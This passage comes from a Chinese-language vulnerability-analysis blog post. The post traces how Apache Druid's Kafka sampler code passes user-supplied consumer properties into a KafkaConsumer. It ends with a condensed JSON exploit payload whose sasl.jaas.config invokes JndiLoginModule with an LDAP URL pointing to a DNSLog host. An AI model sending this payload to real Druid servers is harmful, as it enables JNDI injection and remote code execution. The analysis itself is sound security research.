class="string">&quot;[spec.ioConfig] is required&quot;</span>);</span><br><span class="line"><span class="built_in">this</span>.tuningConfig = ingestionSpec.getTuningConfig();</span><br><span class="line"><span class="built_in">this</span>.samplerConfig = samplerConfig == <span class="literal">null</span> ? SamplerConfig.empty() : samplerConfig;</span><br><span class="line"><span class="built_in">this</span>.inputSourceSampler = inputSourceSampler;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//API接口中sample()调用至此</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> SamplerResponse <span class="title function_">sample</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">final</span> InputSource inputSource;</span><br><span class="line"><span class="keyword">final</span> InputFormat inputFormat;</span><br><span class="line"><span class="keyword">if</span> (dataSchema.getParser() != <span class="literal">null</span>) &#123;</span><br><span class="line">  inputSource = <span class="keyword">new</span> <span class="title class_">FirehoseFactoryToInputSourceAdaptor</span>(</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">SeekableStreamSamplerFirehoseFactory</span>(),</span><br><span class="line">      dataSchema.getParser()</span><br><span class="line">  );</span><br><span class="line">  inputFormat = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  RecordSupplier&lt;PartitionIdType, SequenceOffsetType, RecordType&gt; recordSupplier;</span><br><span class="line">  <span class="comment">//调用至子类KafkaSamplerSpeccreateRecordSupplier()</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    recordSupplier = createRecordSupplier();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SamplerException</span>(e, <span class="string">&quot;Unable to create RecordSupplier: %s&quot;</span>, Throwables.getRootCause(e).getMessage());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  inputSource = <span class="keyword">new</span> <span class="title class_">RecordSupplierInputSource</span>&lt;&gt;(</span><br><span class="line">      ioConfig.getStream(),</span><br><span class="line">      recordSupplier,</span><br><span class="line">      ioConfig.isUseEarliestSequenceNumber(),</span><br><span class="line">      samplerConfig.getTimeoutMs() &lt;= <span class="number">0</span> ? <span class="literal">null</span> : samplerConfig.getTimeoutMs()</span><br><span class="line">  );</span><br><span class="line">  inputFormat = Preconditions.checkNotNull(</span><br><span class="line">      ioConfig.getInputFormat(),</span><br><span class="line">      <span class="string">&quot;[spec.ioConfig.inputFormat] is required&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> inputSourceSampler.sample(inputSource, inputFormat, dataSchema, samplerConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-5.png"
+                      alt="img"
+                ></p>
+<p>org.apache.druid.indexing.kafka.KafkaSamplerSpec继承类SeekableStreamSamplerSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承类SeekableStreamSamplerSpec</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KafkaSamplerSpec</span> <span class="keyword">extends</span> <span class="title class_">SeekableStreamSamplerSpec</span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper objectMapper;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@JsonCreator</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">KafkaSamplerSpec</span><span class="params">(</span></span><br><span class="line"><span class="params">      //将 json 中 spec 转换为KafkaSupervisorSpec ingestionSpec属性</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;spec&quot;)</span> <span class="keyword">final</span> KafkaSupervisorSpec ingestionSpec,</span></span><br><span class="line"><span class="params">      //将 json 中 samplerConfig 转换为SamplerConfig samplerConfig属性</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;samplerConfig&quot;)</span> <span class="meta">@Nullable</span> <span class="keyword">final</span> SamplerConfig samplerConfig,</span></span><br><span class="line"><span class="params">      //值为空注入默认值</span></span><br><span class="line"><span class="params">      <span class="meta">@JacksonInject</span> InputSourceSampler inputSourceSampler,</span></span><br><span class="line"><span class="params">      <span class="meta">@JacksonInject</span> ObjectMapper objectMapper</span></span><br><span class="line"><span class="params">  )</span>&#123;</span><br><span class="line">    <span class="comment">//调用父类构造方法  </span></span><br><span class="line">    <span class="comment">//ingestionSpec为 json 中 spec </span></span><br><span class="line">    <span class="built_in">super</span>(ingestionSpec, samplerConfig, inputSourceSampler);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.objectMapper = objectMapper;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//调用至此方法  </span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> KafkaRecordSupplier <span class="title function_">createRecordSupplier</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">currCtxCl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Thread.currentThread().setContextClassLoader(getClass().getClassLoader());</span><br><span class="line">      <span class="comment">//声明map  将ioConfig中数据添加至map	</span></span><br><span class="line">      <span class="keyword">final</span> Map&lt;String, Object&gt; props = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(((KafkaSupervisorIOConfig) ioConfig).getConsumerProperties());</span><br><span class="line">	  <span class="comment">//向map中插入值</span></span><br><span class="line">      props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">      props.put(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;none&quot;</span>);</span><br><span class="line">      props.put(<span class="string">&quot;request.timeout.ms&quot;</span>, Integer.toString(samplerConfig.getTimeoutMs()));</span><br><span class="line">      <span class="comment">//new KafkaRecordSupplier  </span></span><br><span class="line">      <span class="comment">//proos为前面声明的map   objectMapper   ioConfig为ingestionSpec中ioConfig</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KafkaRecordSupplier</span>(props, objectMapper, ((KafkaSupervisorIOConfig) ioConfig).getConfigOverrides());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">      Thread.currentThread().setContextClassLoader(currCtxCl);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-6.png"
+                      alt="img"
+                ></p>
+<p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorSpec</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonCreator</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaSupervisorSpec</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;spec&quot;)</span> <span class="meta">@Nullable</span> KafkaSupervisorIngestionSpec ingestionSchema,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;dataSchema&quot;)</span> <span class="meta">@Nullable</span> DataSchema dataSchema,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;tuningConfig&quot;)</span> <span class="meta">@Nullable</span> KafkaSupervisorTuningConfig tuningConfig,</span></span><br><span class="line"><span class="params">    //spec json中ioConfig为KafkaSupervisorIOConfig ioConfig</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;ioConfig为&quot;)</span> <span class="meta">@Nullable</span> KafkaSupervisorIOConfig ioConfig,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;context&quot;)</span> Map&lt;String, Object&gt; context,</span></span><br><span class="line"><span class="params">    <span class="meta">@JsonProperty(&quot;suspended&quot;)</span> Boolean suspended,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> TaskStorage taskStorage,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> TaskMaster taskMaster,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> IndexerMetadataStorageCoordinator indexerMetadataStorageCoordinator,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> KafkaIndexTaskClientFactory kafkaIndexTaskClientFactory,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> <span class="meta">@Json</span> ObjectMapper mapper,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> ServiceEmitter emitter,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> DruidMonitorSchedulerConfig monitorSchedulerConfig,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> RowIngestionMetersFactory rowIngestionMetersFactory,</span></span><br><span class="line"><span class="params">    <span class="meta">@JacksonInject</span> SupervisorStateManagerConfig supervisorStateManagerConfig</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">super</span>(</span><br><span class="line">      ingestionSchema != <span class="literal">null</span></span><br><span class="line">      ? ingestionSchema</span><br><span class="line">      : <span class="keyword">new</span> <span class="title class_">KafkaSupervisorIngestionSpec</span>(</span><br><span class="line">          dataSchema,</span><br><span class="line">          ioConfig,</span><br><span class="line">          tuningConfig != <span class="literal">null</span></span><br><span class="line">          ? tuningConfig</span><br><span class="line">          : KafkaSupervisorTuningConfig.defaultConfig()</span><br><span class="line">      ),</span><br><span class="line">      context,</span><br><span class="line">      suspended,</span><br><span class="line">      taskStorage,</span><br><span class="line">      taskMaster,</span><br><span class="line">      indexerMetadataStorageCoordinator,</span><br><span class="line">      kafkaIndexTaskClientFactory,</span><br><span class="line">      mapper,</span><br><span class="line">      emitter,</span><br><span class="line">      monitorSchedulerConfig,</span><br><span class="line">      rowIngestionMetersFactory,</span><br><span class="line">      supervisorStateManagerConfig</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorIOConfig</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonCreator</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaSupervisorIOConfig</span><span class="params">(</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;topic&quot;)</span> String topic,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;inputFormat&quot;)</span> InputFormat inputFormat,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;replicas&quot;)</span> Integer replicas,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;taskCount&quot;)</span> Integer taskCount,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;taskDuration&quot;)</span> Period taskDuration,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;consumerProperties&quot;)</span> Map&lt;String, Object&gt; consumerProperties,</span></span><br><span class="line"><span class="params">  <span class="meta">@Nullable</span> <span class="meta">@JsonProperty(&quot;autoScalerConfig&quot;)</span> AutoScalerConfig autoScalerConfig,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;pollTimeout&quot;)</span> Long pollTimeout,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;startDelay&quot;)</span> Period startDelay,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;period&quot;)</span> Period period,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;useEarliestOffset&quot;)</span> Boolean useEarliestOffset,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;completionTimeout&quot;)</span> Period completionTimeout,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;lateMessageRejectionPeriod&quot;)</span> Period lateMessageRejectionPeriod,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;earlyMessageRejectionPeriod&quot;)</span> Period earlyMessageRejectionPeriod,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;lateMessageRejectionStartDateTime&quot;)</span> DateTime lateMessageRejectionStartDateTime,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;configOverrides&quot;)</span> KafkaConfigOverrides configOverrides,</span></span><br><span class="line"><span class="params">  <span class="meta">@JsonProperty(&quot;idleConfig&quot;)</span> IdleConfig idleConfig</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">super</span>(</span><br><span class="line">    <span class="comment">//topic不为空</span></span><br><span class="line">    Preconditions.checkNotNull(topic, <span class="string">&quot;topic&quot;</span>),</span><br><span class="line">    inputFormat,</span><br><span class="line">    replicas,</span><br><span class="line">    taskCount,</span><br><span class="line">    taskDuration,</span><br><span class="line">    startDelay,</span><br><span class="line">    period,</span><br><span class="line">    useEarliestOffset,</span><br><span class="line">    completionTimeout,</span><br><span class="line">    lateMessageRejectionPeriod,</span><br><span class="line">    earlyMessageRejectionPeriod,</span><br><span class="line">    autoScalerConfig,</span><br><span class="line">    lateMessageRejectionStartDateTime,</span><br><span class="line">    idleConfig</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.consumerProperties = Preconditions.checkNotNull(consumerProperties, <span class="string">&quot;consumerProperties&quot;</span>);</span><br><span class="line">Preconditions.checkNotNull(</span><br><span class="line">    consumerProperties.get(BOOTSTRAP_SERVERS_KEY),</span><br><span class="line">    StringUtils.format(<span class="string">&quot;consumerProperties must contain entry for [%s]&quot;</span>, BOOTSTRAP_SERVERS_KEY)</span><br><span class="line">);</span><br><span class="line"><span class="built_in">this</span>.pollTimeout = pollTimeout != <span class="literal">null</span> ? pollTimeout : DEFAULT_POLL_TIMEOUT_MILLIS;</span><br><span class="line"><span class="built_in">this</span>.configOverrides = configOverrides;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.druid.indexing.kafka.KafkaRecordSupplier</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造方法，代码调用至此构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaRecordSupplier</span><span class="params">(</span></span><br><span class="line"><span class="params">  Map&lt;String, Object&gt; consumerProperties,</span></span><br><span class="line"><span class="params">  ObjectMapper sortingMapper,</span></span><br><span class="line"><span class="params">  KafkaConfigOverrides configOverrides</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>(getKafkaConsumer(sortingMapper, consumerProperties, configOverrides));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法中调用至getKafkaConsumer()</span></span><br><span class="line"><span class="comment">//sortingMapper  为KafkaSamplerSpec中objectMapper</span></span><br><span class="line"><span class="comment">//consumerProperties  为声明的map props  主要数据均在此map中</span></span><br><span class="line"><span class="comment">//configOverrides  为KafkaSamplerSpec  KafkaSupervisorIngestionSpec 中ConfigOverrides</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KafkaConsumer&lt;<span class="type">byte</span>[], <span class="type">byte</span>[]&gt; getKafkaConsumer(</span><br><span class="line">  ObjectMapper sortingMapper,</span><br><span class="line">  Map&lt;String, Object&gt; consumerProperties,</span><br><span class="line">  KafkaConfigOverrides configOverrides</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">final</span> Map&lt;String, Object&gt; consumerConfigs = KafkaConsumerConfigs.getConsumerProperties();</span><br><span class="line"><span class="keyword">final</span> <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">Map&lt;String, Object&gt; effectiveConsumerProperties;</span><br><span class="line"><span class="comment">//    </span></span><br><span class="line"><span class="keyword">if</span> (configOverrides != <span class="literal">null</span>) &#123;</span><br><span class="line">  effectiveConsumerProperties = configOverrides.overrideConfigs(consumerProperties);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  effectiveConsumerProperties = consumerProperties;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将 effectiveConsumerProperties 中数据添加至 props 中</span></span><br><span class="line">addConsumerPropertiesFromConfig(</span><br><span class="line">    props,</span><br><span class="line">    sortingMapper,</span><br><span class="line">    effectiveConsumerProperties</span><br><span class="line">);</span><br><span class="line">props.putIfAbsent(<span class="string">&quot;isolation.level&quot;</span>, <span class="string">&quot;read_committed&quot;</span>);</span><br><span class="line">props.putIfAbsent(<span class="string">&quot;group.id&quot;</span>, StringUtils.format(<span class="string">&quot;kafka-supervisor-%s&quot;</span>, IdUtils.getRandomId()));</span><br><span class="line">props.putAll(consumerConfigs);</span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">currCtxCl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  Thread.currentThread().setContextClassLoader(KafkaRecordSupplier.class.getClassLoader());</span><br><span class="line">  <span class="type">Deserializer</span> <span class="variable">keyDeserializerObject</span> <span class="operator">=</span> getKafkaDeserializer(props, <span class="string">&quot;key.deserializer&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">Deserializer</span> <span class="variable">valueDeserializerObject</span> <span class="operator">=</span> getKafkaDeserializer(props, <span class="string">&quot;value.deserializer&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//new KafkaConsumer&lt;&gt; props为前端出入数据</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(props, keyDeserializerObject, valueDeserializerObject);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">  Thread.currentThread().setContextClassLoader(currCtxCl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-7.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-8.png"
+                      alt="img"
+                ></p>
+<p>调用至new KafkaConsumer()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-9.png"
+                      alt="img"
+                ></p>
+<p>JNDI注入成功（此处DNSLog模拟，真实JNDI注入需可访问JNDI恶意服务器，也需要注意JDK版本现限制）</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkadruidimage-10.png"
+                      alt="img"
+                ></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>精简后payload</p>
+<p>bootstrap.servers 可为任意值</p>
+<p>sasl.jaas.config  值参数上一篇</p>
+<p>topic  不为空</p>
+<p>dataSchema 不为空</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;spec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ioConfig&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;kafka&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;consumerProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;bootstrap.servers&quot;</span><span class="punctuation">:</span><span class="string">&quot;6.6.6.6:9092&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security.protocol&quot;</span><span class="punctuation">:</span><span class="string">&quot;SASL_SSL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;sasl.jaas.config&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://lc7g01.dnslog.cn\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;topic&quot;</span><span class="punctuation">:</span><span class="string">&quot;any&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSchema&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;dataSource&quot;</span><span class="punctuation">:</span><span class="string">&quot;sample&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;timestampSpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;column&quot;</span><span class="punctuation">:</span><span class="string">&quot;!!!_no_such_column_!!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;missingValue&quot;</span><span class="punctuation">:</span><span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;dimensionsSpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;granularitySpec&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;rollup&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">白给</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-04-24 22:38:36</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/04/24/Kafka命令执行漏洞二-Apache-Druid-代码执行漏洞/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/22/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSSRF%E6%BC%8F%E6%B4%9E/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">java代码审计之SSRF漏洞</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
